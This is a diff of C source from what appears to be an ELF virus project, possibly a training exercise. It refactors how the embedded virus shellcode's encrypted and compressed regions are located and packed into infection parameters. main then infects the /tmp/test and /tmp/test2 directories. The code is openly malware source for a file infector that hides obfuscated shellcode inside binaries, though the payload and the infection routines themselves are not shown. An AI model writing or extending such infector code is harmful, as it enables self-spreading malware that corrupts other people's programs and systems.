@@ -23,21 +23,34 @@ int randomize(char *k){
 	return TRUE;
 }
 
-int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
+int get_virus_info(InfectParams *p){
 	if (elf_check_valid(virus_shellcode, virus_shellcode_len) == FALSE) return FALSE;
+	char *v;
+	size_t l;
+	size_t c_off;
+	size_t c_len;
+	size_t cmpr_off;
+	size_t cmpr_len;
 	int64_t bin_start_off;
 	int64_t bin_end_off;
 
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_end", &bin_end_off);
-	(*v) = virus_shellcode + bin_start_off;
-	(*l) = bin_end_off - bin_start_off; 
+	v = virus_shellcode + bin_start_off;
+	l = bin_end_off - bin_start_off; 
 
-	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_start", (int64_t*)c_off);
-	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_end", (int64_t*)c_len);
-	(*c_len) = (*c_len)-(*c_off);
-	(*c_off) -= bin_start_off; 
 
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "cmpr_start", (int64_t*)&cmpr_off);
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "cmpr_end", (int64_t*)&cmpr_len);
+	cmpr_len = cmpr_len-cmpr_off;
+	cmpr_off -= bin_start_off;
+
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_start", (int64_t*)&c_off);
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_end", (int64_t*)&c_len);
+	c_len = c_len-c_off;
+	c_off -= bin_start_off; 
+
+	*p = (InfectParams){v, l, cmpr_off, cmpr_len, c_off, c_len};
 	return TRUE;
 }
 
@@ -86,6 +99,7 @@ int set_garbage_infos(){
 }
 
 int main(int ac, char **av){
+	InfectParams p;
 	char *virus;
 	size_t virus_len;
 	size_t crypt_off;
@@ -95,7 +109,7 @@ int main(int ac, char **av){
 
 	if (!set_garbage_infos())
 		return 2;
-	if (get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len) == FALSE)
+	if (get_virus_info(&p) == FALSE)
 		return 1;
 	randomize(key);
 	for (int i = 1; i < ac; i ++){
@@ -110,7 +124,7 @@ int main(int ac, char **av){
 		//else if (str_equal(av[i], "--big-recur"))
 		//	opt.print_msg = TRUE;
 	}
-	infect_dir("/tmp/test", (InfectParams){virus, virus_len, 0,0, crypt_off, crypt_len}, opt);
-	infect_dir("/tmp/test2", (InfectParams){virus, virus_len, 0,0, crypt_off, crypt_len}, opt);
+	infect_dir("/tmp/test", p, opt);
+	infect_dir("/tmp/test2", p, opt);
 	return 0;
 }
